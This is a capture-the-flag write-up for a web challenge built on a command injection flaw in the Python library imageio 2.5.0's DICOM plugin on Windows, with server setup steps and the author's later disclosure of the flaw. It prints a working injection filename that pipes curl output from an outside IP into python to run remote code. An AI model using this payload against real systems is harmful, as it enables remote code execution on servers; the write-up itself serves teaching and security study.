## Challenge Information

- Name: Silhouettes
- Type: Web
- Description:

```
BGM: [American Football - Silhouettes](https://www.youtube.com/watch?v=-TcUvXzgwMY)
```

- Files provided: none
- Solves: 2 / 720

## Build

1. Amazon EC2 Windows Server 2019
2. [Install IIS and CGI](https://stackify.com/how-to-host-php-on-windows-with-iis/)
  - Web Server (IIS)
    - Ppen "Turn on or off Windows features"
    - Add roles and Features Wizard
    - next, next, next
    - Server roles -> choose "Web Server (IIS)"
    - Features -> next
    - Web server role (IIS) -> next
    - Role Service -> Application development -> CGI
    - Install

3. Install PHP 7.2 x64 via [Microsoft’s Web Platform Installer](https://www.iis.net/downloads/microsoft/web-platform-installer)
  - `wget https://download.microsoft.com/download/8/4/9/849DBCF2-DFD9-49F5-9A19-9AEE5B29341A/WebPlatformInstaller_x64_en-US.msi -O WebPlatformInstaller_x64_en-US.msi`
  - Open Web Platform Installer -> Products -> PHP 7.2.19(x64) -> I accept
  - The PHP Manager for IIS will fail to be installed. It's safe to ignore it.
4. [Enable "Load User profile"](https://stackoverflow.com/a/46535790) such that PHP can use system command.
  - Login to the Remote of your server (if you have access to it)
  - Open the IIS manager
  - Select -> Application Pools node underneath the machine node (left panel)
  - Right click on the desired domainname in the application pools -> Advanced settings
  - Scroll to Process Model
  - Set Load User Profile = True
  - stop and start the applicaiton.

5. Install the following external programs
  - [jpeg-bin](http://sylvana.net/jpeg-bin/jpg9cexe.zip): extract and place under C:\Windows\system32
  - [dcmtk](https://dicom.offis.de/dcmtk.php.en): install dcmtk via [chocolatey](https://chocolatey.org/), `choco install -y dcmtk`
6. Install Python and pip via `choco install -y python3` and `choco install -y pip`
  - It's safe to ignore `easy_install` failing message.
  - Start a new shell.
  - Install the imageio library `pip install imageio==2.5.0`
7. Put `index.php` and `getsize.py` in `c:\inetpub\wwwroot`
  - Delete other `iis*` files in the directory
8. Create a directory `C:\upload` and prevent user listing the content, but they can still upload images.
  - Right click -> properties -> security -> edit -> Users -> List folder contents -> Deny -> OK, yes, OK
9. Flag:
  - Run `craeteflag.py`
10. Permissions revist:
  - `C:/upload`
    - User: denied for list contents
11. Delete powershell history:
   - `cmd.exe /c del %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
   - clean all the file on desktop
   - clean the recycle bin


## Writeup

This is a 0-day challenge of a python library [imageio 2.5.0](https://github.com/imageio/imageio/).   

In one of the plugin of imageio, [imageio/plugins/dicom.py](https://github.com/imageio/imageio/blob/cfbd122442ff324e3a33fb0177b74505b369084e/imageio/plugins/dicom.py#L125-L131), is obviously vulnerable to command injection. 

```python
exe = get_dcmdjpeg_exe()
if not exe:
    raise
fname1 = self.request.get_local_filename()
fname2 = fname1 + ".raw"
try:
    subprocess.check_call([exe, fname1, fname2], shell=True)
```

However, passing a list with `shell=True` makes little sense in `check_call` API. The correct usage is either passing a list with `shell=False` (default), or a string with `shell=True`. Anyway, the behavior will be the following:

```
subprocess.check_call(['foo', 'bar', 'bazz'], shell=True)

# Windows
$ cmd.exe /c 'foo' 'bar' 'bazz'

# Linux
$ sh -c 'foo' 'bar' 'bazz'
```

In linux `sh` will ignore all the parameters after `foo`. You can try this in your shell `sh -c ls -all`. `sh -c ls -all` is identical as `sh -c ls`.

In Windows it's different, the parameters will be passed into the command. `cmd.exe /c ipconfig /all` is identical as `ipconfig /all`.

To exploit this, the system has to satisfy the following conditions:
1. `imageio <= 2.5.0`
2. Operation system is Windows-based.
3. `dcmdjpeg.exe` is installed. Otherwise it will not execute the vulnerable line due to `get_dcmdjpeg_exe()`.
4. The filename can be controlled by users.

You can find the full exploit in `exploit` directory.

#### Payload Explanation

The filename is `a&curl,@240.240.240.240:12345|python&`. Note the command line injection payload cannot contain space. It will be parsed as part of the command, not parameters.

The command executed will be:

```
cmd.exe /c dcmdjpeg.exe 'C:\upload\a&curl,@240.240.240.240:12345|python&' 'C:\upload\a&curl,@240.240.240.240:12345|python&.out'
```

Which is
```
dcmdjpeg.exe 'C:\upload\a&curl,@240.240.240.240:12345|python&' 'C:\upload\a&curl,@240.240.240.240:12345|python&.out' 
```

cmd.exe will parse it as different lines of commands by spliting `&`:

1. `dcmdjpeg.exe C:\upload\a`
2. `curl,@240.240.240.240:12345|python`
3. `C:\upload\a`
4. `curl,@240.240.240.240:12345|python`
5. `.out`

Though the second line does not seem to make sense, it will be parsed as follows:

```
curl ,@240.240.240.240:12345 | python
```

1. curl: The server is running Windows 10 server 2019. `curl` is presented......
2. Space: I found this is Windows's strange behavior. When the command includes a comma, it will be interpreted as the second parameters. That's why we don't need a space here.
3. `@`: The comma is not a valid character in URL, so we use `@` here to bypass it. The syntax is like `username:password@hostname:port`. You can refer to [Orange's slide](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).
4. `|` pipe: `cmd.exe` on Windows 10 seems to support this feature.


## Postscript

In my opinion, designing a 1-day/0-day as a CTF challenge is dangerous and controversial, because making a public library exposed to vulnerability is irresponsible. That's why I was struggling whether to make this challenge or not. In the end, in consideration of the strict prerequisites of this RCE vulnerability, I decided to make this challenge.

I hope this challenge can encourage more people to dive into the source code bravely, because I feel like some beginners are afraid of reading the source code. That's why they are not able to solve some challenging problems.

> The force is with those who read the source. - [Isaac](https://poning.me/), founding member of Balsn

After the competition ends, I mailed to the developer of imageio. He [fixed it](https://github.com/imageio/imageio/pull/483) in just **3 hours and 42 minutes** and bumped the version to 2.6.0. It's incredibly fast!
